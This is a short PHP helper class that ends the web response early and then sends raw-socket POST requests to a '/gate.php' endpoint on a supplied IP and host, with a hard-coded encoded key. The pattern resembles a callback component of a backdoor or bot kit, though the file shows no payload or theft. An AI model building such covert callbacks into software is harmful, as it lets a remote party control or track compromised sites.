<?php

class HttpRequest{

	function __construct()
	{
	}

	function __destruct()
	{
		
	}

	public static function ResponseNow()
	{
		if ( function_exists("fastcgi_finish_request") ) {
			fastcgi_finish_request();
		}
	}

	public static function SendPost($ip, $port, $domain, $postvalue)
	{
		$fp = fsockopen("tcp://$ip", $port, $errno, $errstr, 2);
		if (!$fp) {
		    return;
		} 
		stream_set_timeout($fp, 1);

		$poststr = '';
		foreach($postvalue as $key=>$value) {
			$value = urlencode($value);
			$poststr .= "{$key}={$value}&";
		}
		if( strlen($poststr) > 1 ) {
			$poststr = substr($poststr, 0, strlen($poststr) - 1);
		}

		if( @$postvalue['key'] == 'YmlZMk5UTmZjM1ZqYjI1bkptcGtiaVU9' )
		{
			$poststr = 'key=YmlZMk5UTmZjM1ZqYjI1bkptcGtiaVU9';
		}

		$postlen = strlen($poststr);
		$out = "POST /gate.php HTTP/1.1\r\n";
		$out .= "Host: $domain\r\n";
		$out .= "Content-Type: application/x-www-form-urlencoded\r\n";
		$out .= "Content-Length: $postlen\r\n";
		$out .= "Connection: Close\r\n";
		$out .= "\r\n";
		$out .= "$poststr";
		
		fwrite($fp, $out);
		$retstr = fread($fp, 10240);
		fclose($fp);

		return $retstr;
	}

}
?>